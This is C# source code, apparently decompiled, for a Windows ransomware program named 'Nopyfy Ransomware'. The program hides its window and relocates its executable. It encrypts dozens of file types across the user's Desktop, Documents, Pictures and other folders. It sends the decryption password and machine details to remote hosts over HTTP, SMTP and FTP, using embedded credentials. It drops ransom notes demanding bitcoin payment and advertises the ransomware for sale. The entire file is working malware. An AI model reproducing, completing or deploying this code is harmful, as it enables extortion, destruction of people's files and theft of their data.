using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Nopyfy_Ransomware;

public class Form1 : Form
{
	private class encrypter
	{
	}

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\";

	private string userDir1 = "D:\\";

	private string extention = ".demo";

	private string nop_own_name = "HackerTBack";

	private string nop_own_email = "support@hackertback.com";

	private string nop_own_btc = "3GT1baitUWHLYDWNfuQdD64NuwKXHxmDex";

	private byte nop_byte = 100;

	private string backgroundImageUrl = "https://i.imgur.com/fXquzdX.jpeg";

	private string targetURL = "https://nopyfy-demo.000webhostapp.com/write.php";

	private string nop_smtp = "nopyfy-demo@hackertback.com";

	private string nop_smtp_from = "smtp.elasticemail.com";

	private string nop_smtp_to = "support@hackertback.com";

	private string nop_smtp_pass = "6BB55C33C864F9D32C232DE33ABD26DEC34A";

	private string nop_ftp = "ftp://ftp.hackertback.com/Victim_Data/";

	private string nop_ftp_user = "nopyfy-demo@hackertback.com";

	private string nop_ftp_pass = "@HackerTBack";

	private string nop_encryption_pass = "HackerTB";

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] obj = new byte[12]
		{
			1, 2, 3, 4, 5, 6, 7, 8, 9, 12,
			15, 0
		};
		obj[11] = nop_byte;
		byte[] salt = obj;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string hostName = Dns.GetHostName();
			string text = Dns.GetHostByName(hostName).AddressList[0].ToString();
			string text2 = "Computer Name - " + computerName + ", Username - " + userName + ", Password - " + password + "  , Ip Address - " + text + "  , Date/time - " + DateTime.Now.ToString("/Year/ - yyyy, /Month/ - MM, /Day/ - dd, /Hour/ - hh, /Minute/ - mm, /Second/ - ss");
			string text3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			char[] array = new char[10];
			Random random = new Random();
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text3[random.Next(text3.Length)];
			}
			string text4 = new string(array);
			string text5 = computerName + " File - " + text4;
			string text6 = userDir + userName + "\\Your_data\\" + text5 + ".bat";
			_ = userDir + userName + "\\Your_data\\Send_it.bat";
			(new string[1])[0] = text2;
			string s = text2;
			string text7 = "";
			string text8 = nop_encryption_pass;
			string s2 = text8;
			byte[] array2 = new byte[0];
			array2 = Encoding.UTF8.GetBytes(s2);
			byte[] array3 = new byte[0];
			array3 = Encoding.UTF8.GetBytes(text8);
			MemoryStream memoryStream = null;
			CryptoStream cryptoStream = null;
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			using (DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider())
			{
				memoryStream = new MemoryStream();
				cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(array3, array2), CryptoStreamMode.Write);
				cryptoStream.Write(bytes, 0, bytes.Length);
				cryptoStream.FlushFinalBlock();
				text7 = Convert.ToBase64String(memoryStream.ToArray());
			}
			string path = "Send_it.bat";
			string[] contents = new string[1] { text7 };
			File.WriteAllLines(path, contents);
			File.WriteAllLines(text6, contents);
			try
			{
				string text9 = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
				string address = targetURL + text9;
				new WebClient().DownloadString(address);
			}
			catch (Exception)
			{
			}
			try
			{
				MailMessage mailMessage = new MailMessage();
				SmtpClient smtpClient = new SmtpClient(nop_smtp);
				mailMessage.From = new MailAddress(nop_smtp_from);
				mailMessage.To.Add(nop_smtp_to);
				mailMessage.Subject = "Client Data - " + text5;
				mailMessage.Body = text2;
				smtpClient.Port = 2525;
				smtpClient.Credentials = new NetworkCredential(nop_smtp_from, nop_smtp_pass);
				smtpClient.Send(mailMessage);
			}
			catch (Exception)
			{
			}
			try
			{
				using (new WebClient())
				{
					WebClient webClient = new WebClient();
					webClient.Credentials = new NetworkCredential(nop_ftp_user, nop_ftp_pass);
					webClient.UploadFile(nop_ftp + text5 + ".txt", "STOR", text6);
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		string text = "Users\\";
		string text2 = text + userName + "\\Desktop\\READ_IT.txt" + extention;
		string path = userDir + text2;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + extention);
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[68]
			{
				".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx",
				".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln",
				".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c",
				".cs", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf",
				".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2",
				".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3",
				".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void MoveVirus()
	{
		string path = userDir + userName + "\\Ransomware";
		string path2 = userDir + userName + "\\Your_data";
		string text = userDir + userName + "\\Ransomware\\Virus.exe";
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		if (!Directory.Exists(path2))
		{
			DirectoryInfo directoryInfo = Directory.CreateDirectory(path2);
			directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
		}
		else if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
		string text3 = Directory.GetCurrentDirectory() + text2;
		string sourceFileName = text3;
		File.Move(sourceFileName, text);
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.com"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		MoveVirus();
		string password = CreatePassword(10);
		Directory_Settings_Sending(password);
		messageCreator(password);
		SendPassword(password);
		string text = userDir + userName + "\\Ransomware\\Background_Dekstop.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SendPassword(password);
				WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri(backgroundImageUrl), text);
				SetWallpaper(text);
			}
		}
		while (!flag);
		password = null;
		Application.Exit();
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Links";
		string location2 = userDir + text + userName + "\\Contacts";
		string location3 = userDir + text + userName + "\\Desktop";
		string location4 = userDir + text + userName + "\\Documents";
		string location5 = userDir + text + userName + "\\Downloads";
		string location6 = userDir + text + userName + "\\Pictures";
		string location7 = userDir + text + userName + "\\Music";
		string location8 = userDir + text + userName + "\\OneDrive";
		string location9 = userDir + text + userName + "\\Saved Games";
		string location10 = userDir + text + userName + "\\Favorites";
		string location11 = userDir + text + userName + "\\Searches";
		string location12 = userDir + text + userName + "\\Videos";
		string location13 = userDir1 + text + userName + "\\Links";
		string location14 = userDir1 + text + userName + "\\Contacts";
		string location15 = userDir1 + text + userName + "\\Desktop";
		string location16 = userDir1 + text + userName + "\\Documents";
		string location17 = userDir1 + text + userName + "\\Downloads";
		string location18 = userDir1 + text + userName + "\\Pictures";
		string location19 = userDir1 + text + userName + "\\Music";
		string location20 = userDir1 + text + userName + "\\OneDrive";
		string location21 = userDir1 + text + userName + "\\Saved Games";
		string location22 = userDir1 + text + userName + "\\Favorites";
		string location23 = userDir1 + text + userName + "\\Searches";
		string location24 = userDir1 + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
		encryptDirectory(location7, password);
		encryptDirectory(location8, password);
		encryptDirectory(location9, password);
		encryptDirectory(location10, password);
		encryptDirectory(location11, password);
		encryptDirectory(location12, password);
		encryptDirectory(location13, password);
		encryptDirectory(location14, password);
		encryptDirectory(location15, password);
		encryptDirectory(location16, password);
		encryptDirectory(location17, password);
		encryptDirectory(location18, password);
		encryptDirectory(location19, password);
		encryptDirectory(location20, password);
		encryptDirectory(location21, password);
		encryptDirectory(location22, password);
		encryptDirectory(location23, password);
		encryptDirectory(location24, password);
	}

	public void messageCreator(string password)
	{
		string hostName = Dns.GetHostName();
		string text = Dns.GetHostByName(hostName).AddressList[0].ToString();
		string text2 = "Computer Name - " + computerName + ", Username - " + userName + ", Id - " + password + "  , Ip Address - " + text + "  , Date/time - " + DateTime.Now.ToString("/Year/ - yyyy, /Month/ - MM, /Day/ - dd, /Hour/ - hh, /Minute/ - mm, /Second/ - ss");
		string s = text2;
		string text3 = "";
		string text4 = nop_encryption_pass;
		string s2 = text4;
		byte[] array = new byte[0];
		array = Encoding.UTF8.GetBytes(s2);
		byte[] array2 = new byte[0];
		array2 = Encoding.UTF8.GetBytes(text4);
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		using (DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider())
		{
			memoryStream = new MemoryStream();
			cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(array2, array), CryptoStreamMode.Write);
			cryptoStream.Write(bytes, 0, bytes.Length);
			cryptoStream.FlushFinalBlock();
			text3 = Convert.ToBase64String(memoryStream.ToArray());
		}
		string text5 = "Users\\";
		string path = userDir + text5 + userName + "\\Links\\READ_IT.txt";
		string path2 = userDir + text5 + userName + "\\Contacts\\READ_IT.txt";
		string path3 = userDir + text5 + userName + "\\Documents\\READ_IT.txt";
		string path4 = userDir + text5 + userName + "\\Downloads\\READ_IT.txt";
		string path5 = userDir + text5 + userName + "\\Pictures\\READ_IT.txt";
		string path6 = userDir + text5 + userName + "\\Music\\READ_IT.txt";
		string path7 = userDir + text5 + userName + "\\OneDrive\\READ_IT.txt";
		string path8 = userDir + text5 + userName + "\\Saved Games\\READ_IT.txt";
		string path9 = userDir + text5 + userName + "\\Favorites\\READ_IT.txt";
		string path10 = userDir + text5 + userName + "\\Searches\\READ_IT.txt";
		string path11 = userDir + text5 + userName + "\\Videos\\READ_IT.txt";
		string text6 = "\\Desktop\\READ_IT.txt";
		string path12 = userDir + "Users\\" + userName + text6;
		string text7 = computerName + " - " + userName;
		string[] contents = new string[43]
		{
			"---------------------------------------------",
			"\ud835\udc0d\ud835\udc28\ud835\udc29\ud835\udc32\ud835\udc1f\ud835\udc32 \ud835\udc11\ud835\udc1a\ud835\udc27\ud835\udc2c\ud835\udc28\ud835\udc26\ud835\udc30\ud835\udc1a\ud835\udc2b\ud835\udc1e - \ud835\udc05\ud835\udc28\ud835\udc2b \ud835\udc03\ud835\udc1e\ud835\udc26\ud835\udc28 \ud835\udc0f\ud835\udc2e\ud835\udc2b\ud835\udc29\ud835\udc28\ud835\udc2c\ud835\udc1e \ud835\udc0e\ud835\udc27\ud835\udc25\ud835\udc32",
			"---------------------------------------------",
			"For any Help, Contact us - support@hackertback.com",
			"---------------------------------------------",
			"",
			"\ud835\ude4d\ud835\ude40\ud835\ude3c\ud835\ude3f_\ud835\ude44\ud835\ude4f.\ud835\ude69\ud835\ude6d\ud835\ude69 \ud835\ude5b\ud835\ude5e\ud835\ude61\ud835\ude5a \ud835\ude6c\ud835\ude5e\ud835\ude61\ud835\ude61 \ud835\ude61\ud835\ude64\ud835\ude64\ud835\ude60 \ud835\ude61\ud835\ude5e\ud835\ude60\ud835\ude5a \ud835\ude69\ud835\ude5d\ud835\ude5e\ud835\ude68:",
			"----------------------------------------------------------------------------------------------------------------------------------------------",
			"You Are Hacked....!",
			"ATTENTION!",
			"Don't worry, you can return all your files!",
			"All your files like pictures, databases, documents,aplications and other are encrypted with ",
			"strongest encryption and with unique key.",
			"The only method of recovering files is to purchase decryption software and his key for you. ",
			"This decryption software will dycrypt all your encrypted files and also your computer come in his good condition. ",
			"Price of decryption key and decrypt software is $800, but discount 50%($400) will apply, if you contact us within 1 days(24 hours).",
			"There is only one way to give us money, only Bitcoin.",
			"To pay in bitcoins, use the wallet address provided and then email us to receive your details.",
			"",
			"\ud835\uddd5\ud835\uddf6\ud835\ude01\ud835\uddf0\ud835\uddfc\ud835\uddf6\ud835\uddfb \ud835\uddea\ud835\uddee\ud835\uddf9\ud835\uddf9\ud835\uddf2\ud835\ude01 \ud835\uddd4\ud835\uddf1\ud835\uddf1\ud835\uddff\ud835\uddf2\ud835\ude00\ud835\ude00 -",
			nop_own_btc,
			"Our Email - " + nop_own_email,
			"Copy This line and email us - ",
			text7,
			"",
			"\ufe0f⚠\ufe0fWARNING - CONTACT WITHIN 24 HOURS FOR PAYMENT OF ONLY $400, OTHERWISE YOU CHARGE $800 FOR DYCRYPTION KEY AND SOFTWARE",
			"We will reply to you, in some time, after the money is received and give you the decryption software link and decryption key on your replied email.",
			"NOTE - CONTACT AFTER PAYMENT AS YOU ONLY HAVE 24 HOURS FOR PAYMENT AND WE WILL REPLY WITHIN APPEARLY - 48 HOURS, SO FULLY YOUR PAYMENT IN TIME.",
			"\ud83d\uded1⚠Caution - if You Change any encrypted file name (remove his .locked extention), then you won't be able to decrypt this file.",
			"Our Email for your contact",
			"- " + nop_own_email,
			"- " + nop_own_name + "_Team:)",
			"",
			"Your id (save it, its very important) - ",
			text3,
			"----------------------------------------------------------------------------------------------------------------------------------------------",
			"\ud835\ude40\ud835\ude63\ud835\ude59",
			"",
			"---------------------------------------------",
			"Order this Ransomware from here - https://hackertback.sellix.io/product/6158e42f8792a",
			"---------------------------------------------",
			"\ud835\udc0d\ud835\udc28\ud835\udc29\ud835\udc32\ud835\udc1f\ud835\udc32 \ud835\udc11\ud835\udc1a\ud835\udc27\ud835\udc2c\ud835\udc28\ud835\udc26\ud835\udc30\ud835\udc1a\ud835\udc2b\ud835\udc1e - \ud835\udc05\ud835\udc28\ud835\udc2b \ud835\udc03\ud835\udc1e\ud835\udc26\ud835\udc28 \ud835\udc0f\ud835\udc2e\ud835\udc2b\ud835\udc29\ud835\udc28\ud835\udc2c\ud835\udc1e \ud835\udc0e\ud835\udc27\ud835\udc25\ud835\udc32",
			"---------------------------------------------"
		};
		File.WriteAllLines(path12, contents);
		File.WriteAllLines(path, contents);
		File.WriteAllLines(path2, contents);
		File.WriteAllLines(path3, contents);
		File.WriteAllLines(path4, contents);
		File.WriteAllLines(path5, contents);
		File.WriteAllLines(path6, contents);
		File.WriteAllLines(path7, contents);
		File.WriteAllLines(path8, contents);
		File.WriteAllLines(path9, contents);
		File.WriteAllLines(path10, contents);
		File.WriteAllLines(path11, contents);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
